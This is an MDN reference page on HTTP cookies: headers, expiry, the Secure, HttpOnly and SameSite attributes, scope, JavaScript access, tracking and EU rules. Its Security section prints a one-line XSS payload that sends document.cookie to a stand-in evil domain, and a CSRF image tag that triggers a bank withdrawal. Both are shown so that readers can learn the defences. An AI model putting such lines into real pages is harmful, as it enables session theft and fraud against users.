<h1>Cookies</h1> <p class="summary">An <dfn>HTTP cookie</dfn> (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server. Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the <a href="overview#HTTP_is_stateless_but_not_sessionless">stateless</a> HTTP protocol.</p> <p>Cookies are mainly used for three purposes:</p> <dl> <dt>Session management</dt> <dd>Logins, shopping carts, game scores, or anything else the server should remember</dd> <dt>Personalization</dt> <dd>User preferences, themes, and other settings</dd> <dt>Tracking</dt> <dd>Recording and analyzing user behavior</dd> </dl> <p>Cookies were once used for general client-side storage. While this was legitimate when they were the only way to store data on the client, it is recommended nowadays to prefer modern storage APIs. Cookies are sent with every request, so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web storage API</a> (<code>localStorage</code> and <code>sessionStorage</code>) and <a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API">IndexedDB</a>.</p> <div class="note"> <p>To see stored cookies (and other storage that a web page can use), you can enable the <a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> in Developer Tools and select Cookies from the storage tree.</p> </div> <h2 id="Creating_cookies">Creating cookies</h2> <p>When receiving an HTTP request, a server can send a <a href="headers/set-cookie"><code>Set-Cookie</code></a> header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a <a href="headers/cookie"><code>Cookie</code></a> HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.</p> <h3 id="The_Set-Cookie_and_Cookie_headers">The <code>Set-Cookie</code> and <code>Cookie</code> headers</h3> <p>The <a href="headers/set-cookie"><code>Set-Cookie</code></a> HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:</p> <pre class="syntaxbox">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</pre> <p>This header from the server tells the client to store a cookie.</p> <div class="note">
<strong>Note:</strong> Here's how to use the <code>Set-Cookie</code> header in various server-side applications: <ul> <li><a href="https://secure.php.net/manual/en/function.setcookie.php">PHP</a></li> <li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value">Node.JS</a></li> <li><a href="https://docs.python.org/3/library/http.cookies.html">Python</a></li> <li><a href="http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a></li> </ul> </div> <pre>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]</pre> <p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the <a href="headers/cookie"><code>Cookie</code></a> header.</p> <pre>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre> <h3 id="Session_cookies">Session cookies</h3> <p>The cookie created above is a <em>session cookie</em>: it is deleted when the client shuts down, because it didn't specify an <code>Expires</code> or <code>Max-Age</code> directive. However, web browsers may use <strong>session restoring</strong>, which makes most session cookies permanent, as if the browser was never closed.</p> <h3 id="Permanent_cookies">Permanent cookies</h3> <p>Instead of expiring when the client closes,<em>permanent cookies</em> expire at a specific date (<code>Expires</code>) or after a specific length of time (<code>Max-Age</code>).</p> <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre> <div class="note"> <p><strong>Note</strong>: When an expiry date is set, the time and date set is relative to the client the cookie is being set on, not the server.</p> </div> <h3 id="Secure_and_HttpOnly_cookies">
<code>Secure</code> and <code>HttpOnly</code> cookies</h3> <p>A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol. Even with <code>Secure</code>, sensitive information should <em>never</em> be stored in cookies, as they are inherently insecure and this flag can't offer real protection. Starting with Chrome 52 and Firefox 52, insecure sites (<code>http:</code>) can't set cookies with the <code>Secure</code> directive.</p> <p>To prevent cross-site scripting (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>) attacks, <code>HttpOnly</code> cookies are inaccessible to JavaScript's <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"><code>Document.cookie</code></a> API; they are only sent to the server. For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the <code>HttpOnly</code> flag should be set.</p> <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre> <h3 id="Scope_of_cookies">Scope of cookies</h3> <p>The <code>Domain</code> and <code>Path</code> directives define the <em>scope</em> of the cookie: what URLs the cookies should be sent to.</p> <p><code>Domain</code> specifies allowed hosts to receive the cookie. If unspecified, it defaults to the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/location">host of the current document location</a>, <strong>excluding subdomains</strong>. If <code>Domain</code> <em>is</em> specified, then subdomains are always included.</p> <p>For example, if <code>Domain=mozilla.org</code> is set, then cookies are included on subdomains like <code>developer.mozilla.org</code>.</p> <p><code>Path</code> indicates a URL path that must exist in the requested URL in order to send the <code>Cookie</code> header. The %x2F ("/") character is considered a directory separator, and subdirectories will match as well.</p> <p>For example, if <code>Path=/docs</code> is set, these paths will match:</p> <ul> <li><code>/docs</code></li> <li><code>/docs/Web/</code></li> <li><code>/docs/Web/HTTP</code></li> </ul> <h3 id="SameSite_cookies">
<code>SameSite</code> cookies 
</h3> <p><code>SameSite</code> cookies let servers require that a cookie shouldn't be sent with cross-site requests, which somewhat protects against cross-site request forgery attacks (<a href="https://developer.mozilla.org/en-US/docs/Glossary/CSRF">CSRF</a>). <code>SameSite</code> cookies are still experimental and not yet supported by all browsers.</p> <p>The same-site attribute can have one of two values:</p> <dl> <dt><code>strict</code></dt> <dd>If a same-site cookie has this attribute, the browser will only send cookies if the request originated from the website that set the cookie. If the request originated from a different URL than the URL of the current location, none of the cookies tagged with the <code>strict</code> attribute will be included.</dd> <dt><code>lax</code></dt> <dd>If the attribute is set to lax, same-site cookies are withheld on cross-domain subrequests, such as calls to load images or frames, but will be sent when a user naviates to the URL from an external site, for example, by following a link.</dd> </dl> <h3 id="JavaScript_access_using_Document.cookie">JavaScript access using <code>Document.cookie</code>
</h3> <p>New cookies can also be created via JavaScript using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"><code>Document.cookie</code></a> property, and if the <code>HttpOnly</code> flag is not set, existing cookies can be accessed from JavaScript as well.</p> <pre data-language="js">document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"</pre> <p>Please note the security issues in the <a href="cookies#Security">Security</a> section below. Cookies available to JavaScript can get stolen through XSS.</p> <h2 id="Security">Security</h2> <div class="note"> <p>Confidential or sensitive information should never be stored or transmitted in HTTP Cookies, as the entire mechanism is inherently insecure.</p> </div> <h3 id="Session_hijacking_and_XSS">Session hijacking and XSS</h3> <p>Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an <a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a> vulnerability in the application.</p> <pre data-language="js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</pre> <p>The <code>HttpOnly</code> cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.</p> <h3 id="Cross-site_request_forgery_(CSRF)">Cross-site request forgery (CSRF)</h3> <p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">Wikipedia</a> mentions a good example for <a href="https://developer.mozilla.org/en-US/docs/Glossary/CSRF">CSRF</a>. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:</p> <pre data-language="html">&lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt;</pre> <p>Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:</p> <ul> <li>As with <a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>, input filtering is important.</li> <li>There should always be a confirmation required for any sensitive action.</li> <li>Cookies that are used for sensitive actions should have a short lifetime only.</li> <li>For more prevention tips, see the <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF prevention cheat sheet</a>.</li> </ul> <h2 id="Tracking_and_privacy">Tracking and privacy</h2> <h3 id="Third-party_cookies">Third-party cookies</h3> <p>Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a <em>first-party cookie</em>. If the domain is different, it is said to be a <em>third-party cookie</em>. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the <a href="https://www.google.com/policies/technologies/types/">types of cookies used by Google</a>. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, <a href="https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/">Privacy Badger</a> by the <a href="https://www.eff.org/">EFF</a>).</p> <p>If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikimedia Foundation's <a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>.</p> <h3 id="Do-Not-Track">Do-Not-Track</h3> <p>There are no legal or technological requirements for its use, but the <a href="headers/dnt"><code>DNT</code></a> header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the <a href="headers/dnt"><code>DNT</code></a> header for more information.</p> <h3 id="EU_cookie_directive">EU cookie directive</h3> <p>Requirements for cookies across the EU are defined in <a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">Directive 2009/136/EC</a> of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.</p> <p>In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners (AKA "cookie banners") since then to inform the user about the use of cookies.</p> <p>For more, see <a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">this Wikipedia section</a> and consult state laws for the latest and most accurate information.</p> <h3 id="Zombie_cookies_and_Evercookies">Zombie cookies and Evercookies</h3> <p>A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web storage API</a>, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.</p> <ul> <li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li> <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">Zombie cookies on Wikipedia</a></li> </ul> <h2 id="See_also">See also</h2> <ul> <li><a href="headers/set-cookie"><code>Set-Cookie</code></a></li> <li><a href="headers/cookie"><code>Cookie</code></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"><code>Document.cookie</code></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/cookieEnabled"><code>Navigator.cookieEnabled</code></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Inspecting cookies using the Storage Inspector</a></li> <li><a href="https://tools.ietf.org/html/rfc6265">Cookie specification: RFC 6265</a></li> <li><a href="https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/">Nicholas Zakas article on cookies</a></li> <li><a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Nicholas Zakas article on cookies and security</a></li> <li><a href="https://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie on Wikipedia</a></li> </ul><div class="_attribution">
  <p class="_attribution-p">
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies$edit" class="_attribution-link">Edit this page on MDN</a>
  </p>
</div>
<div class="_attribution">
  <p class="_attribution-p">
    &copy; 2005&ndash;2018 Mozilla Developer Network and individual contributors.<br>Licensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.<br>
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a>
  </p>
</div>
